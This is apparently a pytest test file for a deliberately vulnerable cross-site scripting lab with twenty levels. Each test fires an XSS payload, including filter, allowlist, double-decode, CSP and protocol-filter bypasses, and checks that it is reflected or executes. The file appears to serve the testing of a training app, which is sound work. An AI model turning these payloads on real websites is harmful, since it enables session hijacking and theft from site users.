import pytest
from urllib.parse import quote


def _text(response):
    return response.data.decode("utf-8", errors="ignore")


def test_level1_reflected_xss(xss_client):
    payload = "<script>alert(1)</script>"
    resp = xss_client.get("/level1", query_string={"q": payload})
    assert payload in _text(resp)


def test_level2_stored_xss(xss_client):
    payload = "<script>alert(document.domain)</script>"
    xss_client.post("/level2", data={"comment": payload})
    resp = xss_client.get("/level2")
    assert payload in _text(resp)


def _require_base_url(xss_base_url):
    if not xss_base_url:
        pytest.skip("Browser-based XSS tests require --xss-url.")


def _wait_for_flag(page, timeout_ms=2000):
    page.wait_for_function("window.__xss === true", timeout=timeout_ms)


def test_level3_dom_fragment(page, xss_base_url):
    _require_base_url(xss_base_url)
    page.add_init_script("window.__xss = false;")
    payload = "<img src=x onerror=window.__xss=true>"
    url = f"{xss_base_url}/level3#{quote(payload)}"
    page.goto(url)
    _wait_for_flag(page)


def test_level4_filter_bypass(xss_client):
    payload = "<img src=x onerror=alert(1)>"
    resp = xss_client.get("/level4", query_string={"q": payload})
    assert payload in _text(resp)


def test_level5_attribute_injection(xss_client):
    payload = '" autofocus onfocus="alert(1)'
    resp = xss_client.get("/level5", query_string={"u": payload})
    assert 'onfocus="alert(1)"' in _text(resp)


def test_level6_protocol_injection(xss_client):
    payload = "javascript:alert(1)"
    resp = xss_client.get("/level6", query_string={"link": payload})
    assert 'href="javascript:alert(1)"' in _text(resp)


def test_level7_js_string_injection(xss_client):
    payload = "';alert(1);'"
    resp = xss_client.get("/level7", query_string={"p": payload})
    assert payload in _text(resp)


def test_level8_double_decode(xss_client):
    resp = xss_client.get("/level8?q=%253Cscript%253Ealert(1)%253C/script%253E")
    assert "<script>alert(1)</script>" in _text(resp)


def test_level9_csti(page, xss_base_url):
    _require_base_url(xss_base_url)
    page.add_init_script("window.__xss = false;")
    payload = "{{Object.defineProperty(window,'__xss',{value:true})}}"
    url = f"{xss_base_url}/level9#config={quote(payload)}"
    page.goto(url)
    _wait_for_flag(page)


def test_level10_csp_bypass(xss_client):
    payload = '<script src="/api/widgets?callback=alert(1)"></script>'
    resp = xss_client.get("/level10", query_string={"q": payload})
    assert payload in _text(resp)


def test_level11_entity_decode(xss_client):
    payload = "<img src=x onerror=alert(1)>"
    resp = xss_client.get("/level11", query_string={"q": payload})
    assert payload in _text(resp)


def test_level12_allowlist_bypass(xss_client):
    payload = '<a href="#" onclick="alert(1)">Click</a>'
    xss_client.post("/level12", data={"comment": payload})
    resp = xss_client.get("/level12")
    assert 'onclick="alert(1)"' in _text(resp)


def test_level13_dom_stream(page, xss_base_url):
    _require_base_url(xss_base_url)
    page.add_init_script("window.__xss = false;")
    payload = "<img src=x onerror=window.__xss=true>"
    url = f"{xss_base_url}/level13?msg={quote(payload)}"
    page.goto(url)
    _wait_for_flag(page)


def test_level14_template_literal(xss_client):
    payload = "${alert(1)}"
    resp = xss_client.get("/level14", query_string={"name": payload})
    assert payload in _text(resp)


def test_level15_script_breakout(xss_client):
    payload = "</script><script>alert(1)</script>"
    resp = xss_client.get("/level15", query_string={"title": payload})
    assert "<script>alert(1)</script>" in _text(resp)


def test_level16_deferred_command(xss_client):
    payload = "alert(1)"
    resp = xss_client.get("/level16", query_string={"cmd": payload})
    assert 'var cmd = "alert(1)"' in _text(resp)


def test_level17_srcdoc_xss(xss_client):
    payload = "<img src=x onerror=alert(1)>"
    resp = xss_client.get("/level17", query_string={"doc": payload})
    assert payload in _text(resp)


def test_level18_eval_console(page, xss_base_url):
    _require_base_url(xss_base_url)
    page.add_init_script("window.__xss = false;")
    url = f"{xss_base_url}/level18?calc=window.__xss=true"
    page.goto(url)
    _wait_for_flag(page)


def test_level19_protocol_filter_bypass(xss_client):
    payload = "java%0Ascript:alert(1)"
    resp = xss_client.get("/level19", query_string={"link": payload})
    body = _text(resp)
    assert "java\nscript:alert(1)" in body or "javascript:alert(1)" in body


def test_level20_localstorage(page, xss_base_url):
    _require_base_url(xss_base_url)
    page.add_init_script("window.__xss = false;")
    page.goto(f"{xss_base_url}/level20")
    payload = "<img src=x onerror=window.__xss=true>"
    page.fill("#note", payload)
    page.click("#save")
    page.click("#load")
    _wait_for_flag(page)
